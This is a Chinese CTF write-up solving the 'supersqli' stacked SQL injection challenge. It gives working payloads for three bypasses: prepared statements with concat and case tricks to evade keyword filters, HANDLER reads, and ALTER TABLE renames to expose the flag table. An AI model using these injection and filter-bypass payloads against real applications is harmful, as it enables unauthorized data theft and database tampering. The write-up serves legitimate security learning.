

# 1.解题过程

> 题目描述是随便注，所以web狗的一套连招先放放，注入无果后再说

![image-20230511085401036](https://raw.githubusercontent.com/lanchuangdexingjian/Blog-libray/main/GFSJ-supersqli/image-20230511085401036.png)

通过`GET`传值传输，试试是否能注入

![image-20230511085534158](https://raw.githubusercontent.com/lanchuangdexingjian/Blog-libray/main/GFSJ-supersqli/image-20230511085534158.png)

> 注入：1'or 1=1#

![image-20230511094518949](https://raw.githubusercontent.com/lanchuangdexingjian/Blog-libray/main/GFSJ-supersqli/image-20230511094518949.png)

注入成功，接下来使用堆叠注入获取表名

> 注入：1';show tables;

![image-20230511095118196](https://raw.githubusercontent.com/lanchuangdexingjian/Blog-libray/main/GFSJ-supersqli/image-20230511095118196.png)

查看第一个表，因为表名是纯数字所以使用反单引号包起来

![image-20230511095612691](https://raw.githubusercontent.com/lanchuangdexingjian/Blog-libray/main/GFSJ-supersqli/image-20230511095612691.png)

发现有设置过滤，show一下表查看列发现flag就再这个表里

![image-20230511095955015](https://raw.githubusercontent.com/lanchuangdexingjian/Blog-libray/main/GFSJ-supersqli/image-20230511095955015.png)

## 三种做法

### 1.预编译绕过

[什么是预编译?](https://www.cnblogs.com/micrari/p/7112781.html)

通常我们的一条sql在db接收到最终执行完毕返回可以分为下面三个过程：

1. 词法和语义解析
2. 优化sql语句，制定执行计划
3. 执行并返回结果

我们把这种普通语句称作**Immediate Statements**

但是很多情况，我们的一条sql语句可能会反复执行，或者每次执行的时候只有个别的值不同（比如query的where子句值不同，update的set子句值不同,insert的values值不同）
如果每次都需要经过上面的词法语义解析、语句优化、制定执行计划等，则效率就明显不行了。

所谓预编译语句就是将这类语句中的值用占位符替代，可以视为将sql语句模板化或者说参数化，一般称这类语句叫**Prepared Statements**或者**Parameterized Statements**
预编译语句的优势在于归纳为：**一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止sql注入**
当然就优化来说，很多时候最优的执行计划不是光靠知道sql语句的模板就能决定了，往往就是需要通过具体值来预估出成本代价

**例如：**

**编译**

我们接下来通过 `PREPARE stmt_name FROM preparable_stm`的语法来预编译一条sql语句

```mysql
mysql> prepare ins from 'insert into t select ?,?';
Query OK, 0 rows affected (0.00 sec)
Statement prepared
```

**执行**

我们通过 `EXECUTE stmt_name [USING @var_name [, @var_name] ...]`的语法来执行预编译语句

```mysql
mysql> set @a=999,@b='hello';
Query OK, 0 rows affected (0.00 sec)

mysql> execute ins using @a,@b;
Query OK, 1 row affected (0.01 sec)
Records: 1  Duplicates: 0  Warnings: 0

mysql> select * from t;
+------+-------+
| a    | b     |
+------+-------+
|  999 | hello |
+------+-------+
1 row in set (0.00 sec)
```

可以看到，数据已经被成功插入表中

**具体做法：**

**编译**

```mysql
set @sql = concat("selec",'t * from `1919810931114514`;');
prepare qwe from @sql;
```

**执行**

```mysql
execute qwe;
```

**payload**

```url
1';set @sql = concat("selec",'t * from `1919810931114514`;');prepare qwe from @sql;execute qwe;
```

![image-20230511103451058](https://raw.githubusercontent.com/lanchuangdexingjian/Blog-libray/main/GFSJ-supersqli/image-20230511103451058.png)

发现`strstr()`对关键字`set`和`prepare`进行了过滤，但是mysql对大小写是不"敏感"的所以使用大小写绕过即可

```url
1';Set @sql = concat("selec",'t * from `1919810931114514`;');Prepare qwe from @sql;execute qwe;
```

![image-20230511103720032](https://raw.githubusercontent.com/lanchuangdexingjian/Blog-libray/main/GFSJ-supersqli/image-20230511103720032.png)

### 2.HANDLER查询

MySQL“自古以来”都有一个神秘的HANDLER命令，而此命令非SQL标准语法，可以降低优化器对于SQL语句的解析与优化开销，从而提升查询性能

**语法**

```mysql
HANDLER tbl_name OPEN [ [AS] alias]
HANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,…) [ WHERE where_condition ] [LIMIT … ]
HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST } [ WHERE where_condition ] [LIMIT … ]
HANDLER tbl_name READ { FIRST | NEXT } [ WHERE where_condition ] [LIMIT … ]
HANDLER tbl_name CLOSE
```

**payload**

```url
1';handler `1919810931114514` open;handler `1919810931114514` read first;
```

![image-20230511104324565](https://raw.githubusercontent.com/lanchuangdexingjian/Blog-libray/main/GFSJ-supersqli/image-20230511104324565.png)

### 3.修改表名

> 并不推荐这种解法
>
> 毕竟需要修改题目的数据，一旦失误题目就可能解不开了
>
> 平时做题还好，可以重开环境
>
> **万一是比赛遇到了最后再考略这种解法**

还记得除了flag的表之外还有一个`words`表

show一下这个表的列

> 注入：1';show columns from words;

![image-20230511104633878](https://raw.githubusercontent.com/lanchuangdexingjian/Blog-libray/main/GFSJ-supersqli/image-20230511104633878.png)

可以发现这个表就是输入1时输出的数据所在表

所以将`1919810931114514`表的名字改为`words`就可以获取flag了

**具体做法：**

将`words`表名改为`words1`

```mysql
alter table words rename to words1;
```

将`1919810931114514`表名改为`words`

```mysql
alter table `1919810931114514` rename to words;
```

现在改后的`words`表中没有id字段，php中设置的sql语句就会报错，把flag字段改为id即可

```mysql
alter table words change flag id varchar(100);
```

**payload**

```url
1';alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(100);
```

```url
1'or 1=1;
```



![image-20230511110309299](https://raw.githubusercontent.com/lanchuangdexingjian/Blog-libray/main/GFSJ-supersqli/image-20230511110309299.png)

# 2.总结

之前做过类似的题目，并没有使用过预编译的做法

这次又接触到了一种解题方式，后续会继续了解

